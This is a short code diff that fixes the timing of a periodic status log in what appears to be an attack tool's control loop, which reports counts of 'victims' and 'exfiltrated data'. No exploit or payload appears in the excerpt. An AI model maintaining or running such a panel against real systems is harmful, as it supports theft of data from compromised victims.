@@ -125,14 +125,17 @@ def run(args):
         else:
             logging.info('Running until interrupted...')
             try:
+                last_status_time = time.time()
                 while True:
                     time.sleep(1)
                     
-                    # Periodically show status
-                    if int(time.time()) % 60 == 0:
+                    # Periodically show status every 60 seconds
+                    current_time = time.time()
+                    if current_time - last_status_time >= 60:
                         victims = panel.list_victims()
                         data = panel.get_exfiltrated_data()
                         logging.info(f'Status: {len(victims)} victims, {len(data)} data items')
+                        last_status_time = current_time
             
             except KeyboardInterrupt:
                 logging.info('Interrupted by user')
